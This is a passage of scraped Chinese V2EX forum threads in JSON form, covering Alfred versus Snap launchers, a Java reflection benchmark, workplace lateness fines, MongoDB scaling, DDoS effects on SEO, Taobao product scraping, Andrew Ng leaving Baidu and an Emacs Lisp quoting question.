第三, 它在第二步的选择按键中, 隐藏了一个找 app 的过程\r", "所以, 不如在一开始花一定时间背下 app 对应的快捷键, 后面就能享用最快的速度\r", "最快!", " #25 我只是随便举了几个例子，比如我用 Omni 的 GTD 不用 iOS 自带的，虽然也有语音功能但是电脑上来说还是打字方便。\r", "\r", "还有很多可能不是所有人都能用上的功能，比如我可以 ⌘ + 空格，然后输入：\r", "\r", "`pwgen` 生成随机密码\r", "`maildrop` 生成临时邮箱\r", "`hash` 生成某指定文字的 MD5 或 SHA256 串\r", "`kill` 去停止某个程序\r", "`vpn` / `proxy` 去切换某个代理\r", "`qr` 去生成一个二维码\r", "`dns` 切换 DNS\r", "\r", "很多很多，而且这些东西都可以自己做，这才是 Alfred 强大的地方，只有你想不到的没有他干不了的。\r", "\r", "Spotlight 上原来有个叫 Flashlight 的插件也可以做几乎同样的事，不知道怎么样了\r", "\r", "这些来说语音助手基本不能干了就，而且也的确没有发现能替代的软件。\r", "\r", "也许不是所有人都会有重度用到这些的地方，那么的确也不是必须，但是你用了之后就知道离不开了。", " 你会用 workflow 吗？ 我一样不用打开 Alfred 照样切换程序啊。", "毫无可比性的几个东西， workflow 让我不犹豫地买了 powerpack ，可是非得说这个功能我这个能做到，那个功能这那样也能做到，确实是可以的，然而我就喜欢我要做什么事，都直接 ⌘ + 空格 这个感觉。", " 这个答案真的很赞, 非常感谢.\r", "你这里列举的好多功能, 是真的让我见到了 workflow 的强大.\r", "比如随机密码, 生成临时邮箱, kill 程序, 切换代理等, 这种确实是 繁琐但是常用的.\r", "可惜了其他人总说强大, 强大, 强大, 然后呢, 就没有了,,,,连个最简单的例子都不留, 真的是, 有点浮躁.\r", "还是十分感谢你的回答, 开启了一个新的世界.\r", "ps: snap 和 alfred 不冲突, 只是, 在切换 app 上面, 个人觉得 snap 更有效率", " #30 看了下 snap 的确在切换程序上很赞，准备下一个试试。\r", "不用谢，能理解其他人说半天根本不说怎么用，没用过的人的确不理解。\r", "\r", "不过说实话， Alfred 这个就是没有也能活，有的话提升很多事情的速度，相对来说是个好东西，不过说实话不是必须的\r", "前段时间一直指望那个 Spotlight 的那个插件，后来没关注了，如果那个出来， Alfred 的优势（也许）就没有了", "好一篇软文。。。。 果断引起了群嘲，果断拉升了 snap 的下载量。。", " @", " 其实 Alfred 也可以做到快速打开程序，只要简单设置下就好了，我的常用程序是设置成 Alt + Num , 比如 Iterm2 , chrome 打开，隐藏非常方便。 Command+E 设置成打开 Finder\r", "方法： Workflow 中, triggers->hotkey 增加一个快捷键，然后增加一个 Launch  App 的 Action, 把两者关联起来。", "  原来如此, snap 和 alfred 的这个功能完全一致, 是我以前没仔细研究.", "这种标题就是在浪费大家时间。标题表达的意思看似是:我发现了一个牛 B 的软件，功能上可以完爆 alfred 。别人兴冲冲点进来，看了一堆文字发现，实际帖子内容是:我其实用不到 alfred ，听人说很好用于是下载了试试，发现我只能用到最基础的功能，最强大的功能因为要钱没用过。今天发现了一个软件完全能替代我用到的 alfred 的基础功能", " 那个项目好久没有更新过了……", "有 有道翻译 这个插件 感觉 Alfred 就值了。。。", " 一堆的设置，你能同步吗？换台 mac 又的重新来弄了，是吧！呵呵！\r", "snap 能做到的， alfred 同样能做到，而且这种简单功能在 alfred 里根本就微不足道！ \r", "你连 alfred 这个软件，基本功能都没搞清除，还大言不惭的说 snap 比 alfred 快 100%,删帖吧！别误导小朋友了！", " #36 嗯，好像是死了", "习惯 Alfred 操作方式而又觉得用 Alfred 切换窗口不太方便的，可以试试 Context ，基本上可以设置为这两周方式的结合。尤其对于我这种同一个 App 可能开几十个不同窗口的情况， Context 可以直接模糊搜索窗口标题来切换，大脑负担小。一般的切换器对同一个 App 的不同窗口切换、或者是在不同 App 的不同窗口间快速切换基本是没辙或者很麻烦的。\r", "\r", "举个例子，我在 Safari 里、想快速切换到 Matlab 里一个叫做 Test 2 的 Figure Window(假设有 Test 1 ~ 100 一百个图)，只需要 cmd+tab 、\"t 2\" + 回车就行了。 如果用绑定固定快捷键、你要先切换到 Matlab 、再轮换 100 次窗口。更关键的是语义清楚，无需思考。", "  哇哦, 第二块(抛砖引)玉呢. \r", "暂时我都是及时关闭不用的窗口, 这样一个程序最多最多只用 3 个窗口, 使用 cmd+小撇号即可快速完成切换\r", "绝大多数都是一个 app 一个窗口, 多个也签这样, 这种情况下, 使用快捷键绑定对我还是最方便的\r", "不过, 以后肯定也会接触更多更复杂的情况, 肯定会遇到这种问题, 你的这个软件确实是超多窗口的很好的一个解决方案, 而且价格也不错\r", "话说, 还看了你的其他帖子, 真的很沉静的一个人呢, 很荣幸认识到你这样的人\r", "\r", "希望我文章的小把戏没有让你觉得厌恶, 我相信懂的人自然懂得那种背后的理念, \r", "工具只是工具, 没有高下, 只有用的人的分别\r", "就像不是会了瑞文光速 qa 就比不会的强, 还是要在合适的场景用合理的技能(工具)\r", "话说, @", " 也是一个和你一样超赞的人, 介绍了几个很赞的工作流", "  我觉得 manico 更好用一点哎 作为一个 docker 隐藏的人 来说", " 你不用 emacs 所以感觉 option 键没用 而且同时按 option 和另一个键 基本上大部分按键都不舒服", "  ", "工作流具体你可以看我那个帖子 通过 karabiner 可以实现 按两个键 在 emacs 中编辑任意程序里选中的字符串 然后再按两个键 粘贴回去", "  ", "还有很多常用的 都可以通过按两个键来触发（不是同时按下 类似 emacs 的 keychord ）", "  ", "而且这些都不一定需要通过 alfred  ", "  ", "alfred 只是一个用来执行脚本的工具", "  ", "你说的这个工具也是一样的  ", "  ", "关键是 karabiner", "alfred 好用啊 配合 dash 简直神器", " dock 我也是隐藏的, 但是 dock 隐藏, dock 上程序的顺序还是在的哦. 主要是 snap 能给每个 app 单独设置快捷键, 仅此而已, dock 的映射只是初始时就带的\r", "关键是背下映射不太友好, 但是用久了, 自然就习惯了\r", "就像: 无形装逼, 最为致命....这么多 slogan 都记住了一样, 唯手熟尔, 哈哈", "比较的对象确实不是特别合理。\r", "楼上说的 context 是一个挺好的切换器，我也买了 虽然后面没有再用了。\r", "我比较习惯用 HyperSwitch （这个基本也不更新了虽然……），就是切换的话就是普通的看缩略图找。", "快百分之一百是怎么快，不用时间么"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在了解反射优化的东西，做了一个 cglib,java 的反射 api 和直接调用的性能比较</p>\n<pre><code>public class SampleBean {\n    public String echo(String name) {\n        return name;\n    }\n}\n\n测试代码：\n\n        FastClass fastClass = FastClass.create(SampleBean.class);\n        FastMethod fastMethod = fastClass.getMethod(SampleBean.class.getMethod(\"echo\", String.class));\n        SampleBean myBean = new SampleBean();\n        long start = System.currentTimeMillis();\n        for (int i = 0; i &lt; 1000000; i++) {\n            fastMethod.invoke(myBean, new Object[]{\"haha\"+i});\n            //fastMethod.invoke(myBean, new Object[]{\"haha\"});\n        }\n        System.out.println(\"fastmethod:\" + (System.currentTimeMillis() - start));\n        \n        start = System.currentTimeMillis();\n        Method m = SampleBean.class.getMethod(\"echo\", String.class);\n        for (int i = 0; i &lt; 1000000; i++) {\n            m.invoke(myBean, \"haha\"+i);\n            //m.invoke(myBean, \"haha\");\n        }\n        System.out.println(\"reflect:\"+(System.currentTimeMillis() - start));\n        \n        start = System.currentTimeMillis();\n        for (int i = 0; i &lt; 1000000; i++) {\n            myBean.echo(\"haha\"+i);\n            //myBean.echo(\"haha\");\n        }\n        System.out.println(\"normal:\"+(System.currentTimeMillis() - start));\n</code></pre>\n<p>输出：\nfastmethod:196\nreflect:139\nnormal:72\n上面一段代码如果跑被注释掉的那一行时间会更短：\nfastmethod:38\nreflect:33\nnormal:25\n个人猜测，百万次调用参数不变，是不是被优化了？</p>\n<pre><code>public class SampleBean {\n    public String echo(String name, int age) {\n        //改一下，方法稍微复杂点\n        List&lt;String&gt; names = new ArrayList&lt;&gt;(100);\n        for (int i = 0; i &lt; 100; i++) {\n            names.add(name+i);\n        }\n        List&lt;Integer&gt; ages = new ArrayList&lt;&gt;(100);\n        for (int i = 0; i &lt; 100; i++) {\n            ages.add(age+i);\n        }\n        return name+\"--\"+age;\n    }\n}\n\n测试代码：\n\nFastClass fastClass = FastClass.create(SampleBean.class);\n        FastMethod fastMethod = fastClass.getMethod(SampleBean.class.getMethod(\"echo\", String.class, int.class));\n        SampleBean myBean = new SampleBean();\n        myBean.setValue(\"Hello cglib!\");\n        long start = System.currentTimeMillis();\n        for (int i = 0; i &lt; 1000000; i++) {\n            fastMethod.invoke(myBean, new Object[]{\"haha\"+i, 12});\n        }\n        System.out.println(\"fastmethod:\" + (System.currentTimeMillis() - start));\n        start = System.currentTimeMillis();\n        Method m = SampleBean.class.getMethod(\"echo\", String.class, int.class);\n        for (int i = 0; i &lt; 1000000; i++) {\n            m.invoke(myBean, \"haha\"+i, 12);\n        }\n        System.out.println(\"reflect:\" + (System.currentTimeMillis() - start));\n        start = System.currentTimeMillis();\n        for (int i = 0; i &lt; 1000000; i++) {\n            myBean.echo(\"haha\"+i, 12);\n        }\n        System.out.println(\"normal:\" + (System.currentTimeMillis() - start));\n</code></pre>\n<p>这段代码输出：\nfastmethod:5533\nreflect:4779\nnormal:4691\n结果是 cglib 不如 java 自己的反射 api 快?!!! 直接调和反射差的也不多，是我的这段测试有问题吗？请教一下关于反射优化的问题，谢谢。</p>\n</div></div>"], "reply": "6", "tittle": "Java 反射的性能问题", "comment": ["你可以单独把\"haha\"+i 拿出来测一下性能， int 转 String ，再做一个 String 的拼接，是个比较重的操作", "而且你的测试代码都没有经过 JIT 预热，预热之后再测会更准确", "javap 看一下有什么区别", " 拼字符串的过程大家都有应该关系不大吧，我是单纯好奇 JDK 自己的实现已经比 cglib 都好了", "这里有更详细的测试，或许可以帮到你 ", " 关系当然很大，比如 15:20:150 比例悬殊，但是大家都加个 1000 ，变成 1015:1020:1150 ，可以认为相差不大了。\r", "\r", "JAVA 的 benchmark 比较复杂，不但要剔除无关的 OP ，还要做好 JVM 的 JIT 预热，而且有 4 种风格迥异的 gc 算法，每种 gc 算法还有不同调优参数给你组合，还要跟 CPU 核心数和内存大小结合在一起考量，可能换个参数组合，性能可以差几倍。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>公司从上个月开始实行迟到扣款规则：</p>\n<p><img alt=\"\" src=\"https://ww3.sinaimg.cn/large/006tNc79gy1fe691q1f15j30v408iwgz.jpg\"></p>\n<hr>\n<p>同事这个月迟到了 17 次，理论上要扣<strong>6553550 元</strong>，领导们商量了下，决定扣<strong>1200 元</strong></p>\n<blockquote>\n<p>迟到这么多次的原因：因为赶项目，程序员晚上都加班挺晚的，领导批准可以不用考勤。但是最近突然说执行新策略，所以开始统计迟到次数</p>\n</blockquote>\n<p>我想问下 v 站的朋友们：</p>\n<ul>\n<li>这种做法是不是违反劳动法？</li>\n<li>如果是的话，要怎么保留证据捍卫自己的权益？</li>\n</ul>\n</div></div>"], "reply": "156", "tittle": "互联网公司迟到扣款是否违反劳动法？", "comment": [" 兄弟, 感觉你的逻辑有问题啊。  类似我看的 奇幻小说里面的场景:   你为什么被欺负, 因为你不够强。因为你不够努力. 因为你没有钱权。  还有一点: 这个社会大部分都是普通人。", " 行政部门也要有成就感啊, 要不老板觉得行政上养那么多人, 每天就是帮忙收快递, 他们岂不是快要被裁了?\r", "\r", "公司的行政部门,原来搞过每周一个下午, 全体统一学习\"企业文化\",搞得有模有样, 后来老板觉得浪费时间(主要是浪费老板的工资),就给停了 O(∩_∩)O~", " 遇到这种领导没什么可蒙的，大家收拾东西原地解散就好了。新人从进入公司到真正继续开发至少也要一个到半个月时间，其间还不包括公司急招新人的工资提升成本，以及，新人作到一半无法胜任工作离职之类的例外成本。如果发生了一连串的事件足够一个部门领导离职了甚至公司倒闭了。", "依我愚见，对说这类垃圾公司，垃圾领导，做一个好的程序员，尽量保持 不迟到，不早退， 不非法加班（下班后（逗留）的时间），按规矩办事！ 领导的话就是 bullshit , 加班的话 最好提前给出书面的协议，或是有申请单。", "写入公司章程，完全不违法", " 如果不违法，是不是可以要求支付 6553550 元呢？", "今天八里庄拆迁的大妈把朝阳路堵了，上班迟到我找谁哭去。", " #106 \r", "这么大额 就可能会到劳动仲裁评估一个合理性问题了 肯定不会被支持\r", "\r", "但是单纯的迟到罚款的公司制度，只要写入章程备案，且有明确的通知、下发证据，是受法律保护的", "加班到凌晨第二天迟到扣钱，公司处理不当。正常加班第二天迟到，员工的过错了吧", "  我去年已经离开那个公司了，其实只是碰到了垃圾的领导，我在那家公司做了好几年，也调动过部门，都没有碰到那种 垃圾领导！", "呼吁大家不要 迟到、 早退、 非法加班、恶意加班！做一个好 遵纪 守法 员工！", "#95 +1", "迟到扣钱还叫互联网？", "加班怎么不给钱", "加班的时候拿补贴工资了。\r", "迟到就应该扣工资啊。没有什么解释的。\r", "---------------------------------------------------\r", "如果因为你加班导致迟到，那我是不是可以这样\r", "每天故意加班到晚上 8-9 点，第二天快下班的时候再来公司。\r", "不允许扣工资。。。", " #69 那你可以直接迟到半天啊", " 行政部门很闲这是真的。公司体量不大。建议很中肯，谢谢", " 突然执行，比较让人无法接受", " 想到一个梗：公司 2017 年实现盈利，收入来源为员工乐捐", " 是的，同事打算以后准时上下班", " 哈哈哈，放宽心兄弟", "我有几次加班到很晚, 都住在公司了", " 是的，小厂做事挺不规范的", " 同事曾经连续上 12 天班（周末没休息），加班数月", " 团建还要做游戏，不胜其扰", " 哈哈，慎入", " 没有满勤奖", " 感谢", " 请假最少半天，不一定批", " 哈哈哈哈哈，这个观点 666", " 旷工扣 3 天", " 是的，创业团队，目前还没盈利", " 回头就是一脚🙂", " 行政有毒", " 👍是的", " 同修路导致迟到，坐标厦门", " 没有补贴的", "    晒一晒 公司出具的 加班时长清单~", " #137 182 小时，让人活不-。-", " 没错，这政策的对策就是，早晨一旦发现要迟到，立马请半天假，继续睡。", " 领导回复：老铁没毛病，先把这 600 多万的帐结一下", "别的不说，乐捐这词真难听", " 还不如组织半天去搞体育活动。不过这么大方的公司估计没几个。。", " 平均每天加班 6 小时而已，其实就是 997 的“正常节奏”", "上梁不正下梁歪，效仿作用很明显。\r", "\r", "首先不要说是否违法，应该考虑有没有改变的余地？ IT 圈一些不良氛围：“加班、创业潮、奴化员工、程序员互相怼、拿着看似比别人高的收入就觉得自己高人一等（或者说智商高）”，都是有着一些带头大哥的（团体或组织）。\r", "\r", "首先加班很晚了，来迟到还要扣工资就是脑残行为，因为这是在奴化员工（以前我在某大司工作的时候他们就是这么干的），另一个不是逼人走就是为了节约成本的做法。\r", "\r", "在这种脑残公司一般不必多说，要么上有政策下有对策，要么直接走人，任何周旋都是浪费时间。\r", "现在因为有人口红利，所以才会有这么多的企业乱来，等人口红利再继续衰退下去，估计接下来又是 IT 圈要死一大片的节奏。", " #138 加班好多，薪水很高吧？！！", "  然而并不高，后来我们那个团队的人都离开了", "果断走人了，能出这种政策显然是经过老板同意的", "罚款还美名为“乐捐”，不是恶心人吗？只有惩罚没有奖励，制定的规章制度要有合理公平之处，即不合理又不公平，这样的制度谁会服，这样的领导这样的公司呆着干嘛，早点走人。", "我是这么觉得, 没有什么违法可言, 如果当初公司确立新政策大家都没有提出异议的话, 这也就成了公司的制度了, 国有国法,家有家规嘛, 不愿意服从他们的制度的, 那样可以换一家公司 或者 推进制度改革的. \r", "ps: 我上班这边公司规定 9 点 35 迟到, 部门规定 9 点 30, 只要超过了 9 点 30 还是一样要发红包....", " 在哪都能发现小姜尸 rua~", "程序员们上个月单方面决定收取加班费：\r", "\r", "关于加班补贴办法\r", "每人每月可以有 3 次准点下班\r", "除不可控外界因素可不计（办公楼倒塌，公司倒闭等）\r", "\r", "对每月加班行为，补贴规则如下：\r", "上班加班，第一天补贴价值 50 元商品，第二天补贴 100 元商品，第三天补贴 200 元商品，第四天补贴 400 元商品，以此类推翻倍，不设上线。\r", "\r", "同事这个月主动加班 17 天，理论上要发 6553550 元，程序员们商量了下，决定问公司要 1200 元。\r", "\r", "加班这么多的原因，是因为程序员们热爱工作，热爱公司，热爱写程序，更热爱软妹币。\r", "\r", "提问：\r", "1.程序员这么做是否违法？\r", "2.如果是，公司该如何捍卫自己的权益？", " 182 小时需要 9-11-7 这样上班吧？曾经有一段时间也是这样上班的", "记得 10 年前  我有一个月吃到扣了 800 。 从此以后，选择公司第一个问题就是  “贵司是否打卡上班？”", "迟到扣员工钱，加班扣领导钱，即可", "迟到扣钱应该不应该不讨论，\r", "频繁加班没补贴无调休，不该想着跳了么？\r", "老板出尔反尔，不该想着跳了么？\r", "公司无奖只罚，不该想着跳了么？\r", "顺带曝公司名， "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>leader 下午找谈话</p>\n<p>leader ：你做一个活动页，不算在排期内</p>\n<p>me ：那什么时候做？</p>\n<p>leader ：下班了做，周末也行</p>\n<p>当时十分的愤怒</p>\n</div></div>"], "reply": "18", "tittle": "什么样的 leader 才算是一个好 leader 啊？！", "comment": ["愿意信任 给下属时间和空间", "你的 leader 不会说话，而且你们关系不好。。", "告诉 leader 周末女朋友性欲强 身不由己(´・ω・｀) leader 嗅到空气中散发的荷尔蒙 忍不住大保健了一发 就拜托你做的事了啊哈哈哈哈", "直接对回去", "领导单独叫谈话的话时候记得开手机上的录音 app 。", "钱到位就行", "1. 有担当的\r", "2.会为兄弟谋福利", "给钱，不算在加班与工资内。\r", "我司就有一人，我很佩服。规定是朝九晚六，他来的早，在刚六点的时候， Boss 说要找他了解一个东西，他：我已经下班了。", "我也不知道。", "之前的上司，项目比较赶，然后每天下班后准时开会，美其名不占用大家开发时间", "加班费怎么算？", "好 leader 主要做 3 个工作：\r", "做决策（分配工作，排期）；\r", "发奖金；\r", "招牛逼同事。\r", "可能还有一个：职业方向的指导，发挥每个人的优势，但是这个应该算是软技能了", "回：不做！ 滚！！！", "不做", "拖~", "  差一点啊", "  这个要谨慎啊  刚刚毕业 没啥钱 目前工作也不好找", "  感觉大神可以这么回复"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一篇深度好文</p>\n<p><a href=\"https://www.qcloud.com/community/article/451090001487836806?fromSource=gwzcw.58451.58451.58451\" rel=\"nofollow\">人人都可以做深度学习应用：入门篇（上）</a></p>\n<p><a href=\"https://www.qcloud.com/community/article/834521001487836126?fromSource=gwzcw.58452.58452.58452\" rel=\"nofollow\">人人都可以做深度学习应用：入门篇（下）</a></p>\n</div></div>"], "reply": "10", "tittle": "人人都可以做深度学习应用：入门篇", "comment": ["求求你，不要再说这样的鬼话了！", "标题前面因该加上：震惊；结尾应该加上：不转不是中国人！", "以我掉坑无数的经验来说，上来就讲框架的“人人都可以”全是扯", "学不过来", "人人都可以，但是要从小培养。", "block +1", "人人只能当产品经理", "入门，请先把几门数学课深入学一下。", "鹅厂自己的框架呢？？", "dl 已经被弱智化成调参数了 散了吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如标题，最近想弄一个 b/s 结构的（可以通过设置定时执行任务，或者监听实施数据等方式）来把各种内网应用系统数据统一显示在一个界面的东西.</p>\n<p>前期想通过配置各个数据库连接类型，连接方式，执行的 sql 语句及执行频率来把数据放到中心数据库，通过 web 形式显示出来。</p>\n<p>先问问有没有现成的轮子最好是 python 语言的，以前有个医疗公司使用 orion health rhapsody ，但是这个好像无法连接 mssql 数据库，而且没有展示界面！</p>\n</div></div>"], "reply": "6", "tittle": "有没有通过定时任务读取各种数据库（主要 mssql、oracle）内容并前台显示的框架或者现成轮子。", "comment": ["power bi 可以直接用", " \r", " power bi 确实挺好的，但是暂时不支持本地化部署就比较麻烦了，据说“ 预计今年年中发布本地部署的完整解决方案”\r", "有没有可以多人使用的内网轮子，感谢分享", "meteor 写写就好", "  网上找了这个 ", "\r", "本来准备用 Goldengate 同步数据到 oracle 然后显示出来，先试试上面那个，网上中文的很少有说明，不过部署完应该很简单使用，没有中文就得手工修改了\r", "  ![Alt text]( ", " \"示例图片\")", " 这个我看说明是不能支持 mssql 数据库，多数据库好像也不支持"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前公司 MongoDB （ Version:2.6)单机运行，大并发查询与写入的时候性能很低</p>\n<p>想到的解决方法：</p>\n<p>1 、据说 3.X 版本性能有很大提升，但是测试环境升到 3.4 直接好多方法已废弃，代码上要进行大量修改，这条路貌似走不通</p>\n<p>2 、另一个方法就是集群，但是感觉百万量级上集群是不是杀鸡用牛刀了？</p>\n<p>所以有两个问题想请教各位</p>\n<p>Q1 ：尽量不大量修改代码的情况下， MongoDB 3.X 哪个版本可用？</p>\n<p>Q2 ：上集群是否大材小用，毕竟在 MongoDB 上没有太多经验</p>\n</div></div>"], "reply": "22", "tittle": "mongoDB 百万量级是否需要做集群？", "comment": ["1. 大量查询为啥不做 replica?\r", "2. 写入性能低的原因是什么？只是磁盘么？换 SSD ？", "连接池和异步有试过么？大并发查询每次都打到数据库？有考虑过热点缓存么？", "我觉得把这个做好了，你应该能撑一段时间了", "只是百万级别的就不行了？不是吧", "其实想问，这个量级为何不用 mysql 。\r", "\r", "然后，你们应该先测试下单纯写的效率。读的话索引是否合理等。\r", "集群也可以啊， mongodb 上集群简单。只是还是觉得你们这条路走下去很可能还是得回到 mysql 。。。", " 之前因为大并发下硬盘太慢， page faults 太多，于是换了一台新服务器，只跑 MongoDB 。平时内存占用只在 1GB 左右， 但是并发测试下依旧很慢，这时 Mongostat 查看 page faults 并不多，内存占用升到 4GB 左右", "百万量级应该单机是能抗住的, 建议分析一下瓶颈在哪里, 优化一下程序;", "超过十万就需要，不仅仅是扛量，更多的是主从，挂了还能接着用。。。\r", "\r", "另外。。。为毛不用 mysql 。。。 mongodb 我知道的都切回了 mysql 。。。量越大切的越早。还是有这么多要当小白鼠的", "没有经验还要去趟雷。。", "测试环境模拟并发，几乎不能复现，推测应该不是性能问题，看来现在要转变思路解决问题了", "写入是修改，还是新插入？修改如果超过原 doc 的 size ，就会新开辟空间并产生碎片。\r", "\r", "查询，可以加索引，组合索引。\r", "\r", "卡的时候最好用 MMS 看看。", "每个月都要被 MongoDB 坑一次的来围观", "mongodb 2.6 问题挺多的。不推荐使用。\r", "\r", "mongodb 就我使用经验而言，查询和插入的性能和 pg 比较并没有优势。", "百万量级是个什么概念？百万并发请求？", "page faults 太多是内存配的太小吧？\r", "mmap 还是 wt 引擎？\r", "\r", "我们集群过亿的 collection 有好几个，也就 2 节点读 1 primary 写。\r", "\r", "根据我的经验，大部分性能问题是因为没有 mongodb 经验，从根本上来说除了因为实现不同导致一些差异(例如没有事务)外，性能上都有解决方案。只是 mysql 现成文档多， mongodb 需要自己钻研。", "另外单机你不怕丢么？", "面试时被问到 mongodb 的使用业务场景，我瞬间懵逼了......我回答的是用户无规律行为（如点击链接，数据统计分类不明确时）", "也从 2.6 升级到 3.2 ，没遇到什么不兼容问题啊。。\r", "不过话说用了许久 mongodb 整体感觉确实有点怪，压力不高但是慢查询一堆，整体性能还是很靠谱的，不过 3 的 wt 引擎感觉性能更稳定一些，用来做日志缓冲，每天写几千万也毫无压力", "少用 mongodb 啊，被坑过", "mongo 优化的好比 mysql 方便的多， 问题是版本更新太快，兼容性不好，网上的资料又比较杂，用起来比较费劲。那些说 mongo 坑的， 估计是习惯了关系数据库那一套，不想折腾吧", "集群都不做，看来数据不重要", "之前发的不知道为什么没有了，测试环境模拟大并发不能复现，看样子不是性能问题，已经考虑做 replica 实现容灾了，谢谢各位"]},
{"content": "", "reply": "6", "tittle": "网站一直被 DDOS，每天几次吧，流量不是很大，最大 5g，最小才 50M，网站都能访问，这会对网站在搜索引擎产生负面影响吗？", "comment": ["有没有负面影响你看看服务器能不能正常运行，能不能成功完成所有用户的请求不就知道了。你在这问有没有负面影响，我告诉你一万 G 的流量的攻击也没有任何负面影响，问题是我们说的有个毛用嘛！难道我们说没有影响，你的服务器就没有影响了？哈哈。", "推荐你注册登陆百度站长平台，观察相关周期内的数据。\r", "如果说网站可以访问的话，我个人感觉影响不是太大，只是会影响百度的抓取频率，降低频率，相应的一系列反应就出现了。。至于程度如何还是得看你所谓的“能访问”是啥样程度的。 TITLE 加载完了半天出页面，那也叫能访问。如果只是稍慢一点的响应，还是可以在一个正常人访问“卡”的页面的范围值内，那基本没什么问题的，有个词叫不痛不痒，可能就是说的这种攻击量吧。罗嗦半天，第一句是核心。", "网站数据能获取到，就没有什么太大的问题", "5 个 g 运营商都没有封你 ip ？还是前端用了抗 ddos 的服务", "羡慕 5G 都没炸的，腾讯云 2G 直接 NULL ，上次被打了好几倍", " 网站是能正常访问，但是谷歌站长后台冒出了一些 522 错误，估计还是有点影响，会拖慢一些加载速度相对长一点的网页，这是阿里云的 ecs ， 2G 看不出变化， 5G 也是直接趴下......"]},
{"content": ["<div class=\"topic_content\">jenkins 系统 有一个输出窗口 是可以直接看 脚本执行的内容的，这个输出窗口是在网页上的。\r<br>\r<br>数据源方面，很容易把一个进程的标准输出 字符流拿到，并新输出成为 数据源，但是网页方面 是如何可以持续在网页上输出内容的呢？ 比如我写了一个简单的 tcp server  它可以不断的输出 字符串， 在网页上改如何持续得把这个源里的数据 显示在一个 div 或者 一个页面里面呢？这个数据输出 并不是一直的 可能会卡住几分钟，而网页上不会断开，这个和轮询模拟好像不一样。\r<br>\r<br>如果描述得不清楚，可以去 jenkins 上看一看就知道了</div>"], "reply": "2", "tittle": "前端们 这个效果是如何实现的？", "comment": ["Websocket", "webaocket 读取数据 不难，如何在网页里一直模拟出控制台的状态呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，类似于什么值得买，豆瓣东西等商品聚合类网站，提交一个商品 url 就可以拿到商品详情信息。</p>\n<p>想问一下他们是爬虫还是内部公司之间的合作？</p>\n<p>如果是爬虫，必须渲染 js 才可以拿到部分数据，但是我用 phantomjs 去做渲染，可以拿到数据，但是至少 10s,是不是有更好的解决方案？</p>\n<p>PS: 淘宝原先的 API 已经关闭了</p>\n</div></div>"], "reply": "5", "tittle": "请教一个关于淘宝商品详情实时获取问题？", "comment": ["想要快只能去 hack 接口了把", "淘宝和京东可以在 jsonp 里面取一些商品信息。", "目测用的是爬虫，定时抓取，然后提交 URL 后从自己数据库查，不然不可能那么快。", " jsonp 应该做了一些反爬虫，发现模拟请求也老是得不到，请指教一二，谢谢", " 这么多商品信息，这也太大了吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>记得当时百度出现魏则西等一系列事件之后，还有人给吴恩达写过邮件，控诉他不应该为百度效力。</p>\n<p>大家怎么看？我个人也认为吴恩达这种人物也不应当在百度继续工作。</p>\n<p>附吴恩达公开信： <a href=\"https://medium.com/@andrewng/opening-a-new-chapter-of-my-work-in-ai-c6a4d1595d7b#.p3l819k1m\" rel=\"nofollow\">https://medium.com/@andrewng/opening-a-new-chapter-of-my-work-in-ai-c6a4d1595d7b#.p3l819k1m</a></p>\n</div></div>"], "reply": "26", "tittle": "百度首席科学家吴恩达宣布离职，大家怎么看？", "comment": ["不知道私下里和百度撕了没 ==", "姓 Ng 啊？粤语的吴", "百度这样的公司注定留不下这样的大牛吧。。。", "刚在 twitter 上看到，没待几天吧，我记得一个月前还发推说百度买硬件快，吐槽 google 巨慢", "待了不到三年，可能是待遇太好了所以才离职吗。。哈哈哈", " 百度在硅谷的 AI 中心貌似大牛蛮多的", "没说为什么离职", "不应该放走达哥啊！这么好的一张名片。\r", "现在搞深度学习的人，尤其半路出家的，大部分刷过达哥的入门课吧。", "Coursera 家的看家课程就是他的那个。", "估计是互相利用的资源都拿到了吧...", "我也在学他的 ML.\r", "据说他走的原因是, 百度搞 AI 只是为了给投资人看, 而不是真的想搞.", " 说错, 据说百度想搞 AI 是给投资人看, 而不是真的想搞, 也许这是他走的原因.", "是去娱乐圈了吗？", "吴恩达是台湾人，所以共产党决不允许，这种情况，这就是真相", " 你这扯淡 别个是 生在香港  长在星加坡  留学定居到美国", "应该是会硅谷跟他女神老婆一起继续无人车了。 ", "怎么一直没听说百度出过什么 AI 的产品啊...", "出去立山头了呗\r", "\r", "否则在百度内部光撕 B 了", "路奇上位, 吴不爽就离开了呗. 于已于百度都不错.", " 毕竟 cousera 就是因为这个课才存在的，亲儿子（亲爸爸？）嘛", " Ng 应该是一直在硅谷并没有离开（百度研究院在硅谷）", "本月最佳", " 应该是本年度目前最佳", "一山不容二虎吧", " 才知道 drive.ai 的创始人里也有他老婆。 drive.ai 现在非常被看好，估计是吴恩达潜在的下家", "有人能给出一份百度认真的盈利报告，以及预期么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>(setq hello \"helloworld\")\n(setq header '( (\"Hello\" . \"World\") (\"Helo2\" . \"world2\") (\"hello3\" . hello)))\nheader</p>\n<p>我要如何才能让 header 进行 eval 后的结果是\n((\"Hello\" . \"World\") (\"Helo2\" . \"world2\") (\"hello3\" . \"helloworld))\n而不是\n((\"Hello\" . \"World\") (\"Helo2\" . \"world2\") (\"hello3\" . hello))</p>\n</div></div>"], "reply": "2", "tittle": "请教一个关于 emacs lisp 的问题", "comment": ["```\r", "(setq hello \"helloworld\") \r", "(setq header `( (\"Hello\" . \"World\") (\"Helo2\" . \"world2\") (\"hello3\" .  ,hello)))\r", "```"]},
